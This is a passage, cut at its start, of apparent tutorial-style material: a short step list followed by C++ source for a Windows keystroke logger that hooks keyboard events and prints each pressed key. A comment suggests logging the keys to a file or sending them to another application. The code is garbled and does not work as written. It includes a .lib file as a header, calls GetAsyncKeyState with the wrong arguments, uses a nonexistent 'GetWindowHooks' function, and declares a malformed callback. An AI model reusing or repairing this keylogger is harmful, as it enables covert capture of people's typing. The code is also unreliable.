   - Initialize the hook and start it.
   - Wait for key events.
   - Stop the hook when done.

### Code:

```c++
#include <windows.h>
#include <user32.lib>
#include <iostream>
using namespace std;

void CALLBACK KeyPress(int hHeap, int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == WH_KEYBOARD) {
        // Get the keyboard state
        BYTE keys[256];
        GetAsyncKeyState(0, keys);

        // Check if a key is pressed
        if ((wParam & 0x00010000) != 0) {
            for (int i = 0; i < 256; ++i) {
                if ((keys[i] & 0x01) != 0) {
                    // Record the key press
                    cout << "Key: " << static_cast<unsigned char>(i) << endl;
                    // Optionally, log to a file or send to another application
                }
            }
        }
    }
}

void StartKeyboardHook() {
    HHOOK hHook = SetWindowsHook(WH_KEYBOARD, KeyPress);
    if (hHook == NULL) {
        cout << "Failed to set keyboard hook." << endl;
    }
}

void StopKeyboardHook() {
    HHOOK hHook = GetWindowHooks(WH_KEYBOARD);
    if (hHook != NULL) {
        UnhookWindowsHook(hHook);
    }
}

int main() {
    StartKeyboardHook();
    while (true) {
        // Keep the program running
        Sleep(1);
        // Stop after a few seconds
        if (GetTickCount() >= 30000) {
            StopKeyboardHook();
            break;
        }
    }
    return 0;
}
```

